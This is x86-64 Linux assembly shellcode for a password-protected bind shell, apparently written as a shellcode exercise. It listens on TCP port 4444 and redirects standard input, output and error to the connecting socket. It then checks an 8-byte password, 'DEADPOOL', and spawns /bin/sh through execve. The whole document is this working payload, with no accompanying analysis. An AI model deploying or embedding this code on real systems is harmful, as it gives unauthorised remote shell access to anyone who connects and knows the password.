global _start

_start:

	; sock = socket(AF_INET, SOCK_STREAM, 0)
	; AF_INET = 2
	; SOCK_STREAM = 1
	; syscall number 41

	push 41
	pop rax
	push 2
	pop rdi
	push 1
	pop rsi
	cdq
	syscall

	; copy socket descriptor to rdi for future use

	xchg rdi,rax

	; server.sin_family = AF_INET
	; server.sin_port = htons(PORT)
	; server.sin_addr.s_addr = INADDR_ANY
	; bzero(&server.sin_zero, 8)

    xor rsi, rsi
    push rsi         ; 127.0.0.1
    push word 0xd204 ; 4444
    push word 0x2    ; AF_INET

	; bind(sock, (struct sockaddr *)&server, sockaddr_len)
	; syscall number 49

	mov rsi, rsp
	mov al,49
	push 16
	pop rdx
	syscall

	; listen(sock, MAX_CLIENTS)
	; syscall number 50

	push 50
	pop rax
	push 2
	pop rsi
	syscall

	; new = accept(sock, (struct sockaddr *)&client, &sockaddr_len)
	; syscall number 43

	mov al,43
	sub rsp,16
	mov rsi,rsp
	push 16
	mov rdx,rsp
	syscall

	; duplicate sockets

	; dup2 (new, old)
	xchg rdi,rax
	push 3
	pop rsi

dup2cycle:
	mov al, 33
	dec esi
	syscall
	loopnz dup2cycle

	; read passcode
	; xor rax,rax - already zeroed from prev cycle
	xor rdi,rdi
	push rax
	mov rsi,rsp
	push 8
	pop rdx
	syscall

	; Authentication with password "DEADPOOL"
	xchg rcx,rax
	mov rbx,0x4c4f4f5044414544
	push rbx
	mov rdi,rsp
	repe cmpsb
    jnz exit

next:
    xor rax, rax
    mov al, 57
    syscall
    cmp al, 0
    jnz _start

	; execve stack-method
execve:
	push 59
	pop rax
	cdq ; extends rax sign into rdx, zeroing it out
	push rdx
	mov rbx,0x68732f6e69622f2f
	push rbx
	mov rdi,rsp
	push rdx
	mov rdx,rsp
	push rdi
	mov rsi,rsp
	syscall


exit:
    xor rax, rax
    push rax
    pop rdi
	mov al, 60
    syscall
